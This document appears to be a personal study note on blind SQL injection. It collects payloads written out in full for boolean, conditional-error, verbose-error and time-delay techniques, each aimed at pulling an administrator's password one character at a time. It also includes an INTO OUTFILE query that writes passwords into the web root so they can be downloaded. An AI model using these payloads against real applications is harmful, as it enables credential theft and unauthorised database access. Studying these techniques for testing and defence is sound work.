# blind SQLi

at this point there is an SQLi but we can't extract info directly because the
application's HTTP responses don't return the result of SQL quires or database
errors.

Exploit:

based on conditional responses: conditional responses (boolean), conditional errors, time delays.
## [[SQLi Blind boolean| boolean based]]

injecting test conditions that return either true or false;slowly inferring the
structure of the database.

1. `TrackingId=EGsveqHgcMpxwCB8' AND '1'='1;`
2. `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`
3. `' AND (SELECT 'a' FROM users LIMIT 1) = 'a'--` 
4. `SELECT SUBSTRING(password,{index},1) FROM users WHERE USERNAME='administrator') = '{c}' --` to brute-force char by char

## [[SQLi Blind Error Based| Error based]]

### conditional errors:

2. `xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a`
3. `xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`

### Verbose Error Messages:

1. `CAST((SELECT example_column FROM example_table) AS int)` might trigger an error
2. `' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT) --`
## [[SQLi Blind Time Delays| Time Delays]]

1. `'; IF (1=1) WAITFOR DELAY '0:0:10'--`
2. `("32H3bfd687INjf7b' || (SELECT CASE WHEN (SELECT SUBSTR(password,%d,1) FROM users WHERE username='administrator') = '%c' THEN pg_sleep(10) ELSE pg_sleep(0) END) --", index, c)`

## using out-of-band techniques

an app could carry out an SQL query *asynchronously*.

it uses the original thread to process the user's *request* and another to execute the query using the tracking cookie.

the app doesn't wait for the SQL query to return, it's response to user doesn't depend on it, be it an error or the delay.

the query could be vulnerable, but how do we know?

triggering the server to send DNS lookup query to our server.

## exfiltration:

store info somewhere on the local machine:

`SELECT Password FROM Users WHERE Username='admin' INTO OUTFILE '/var/www/html/output.txt'`

then request the file: `https://example.com/output.txt`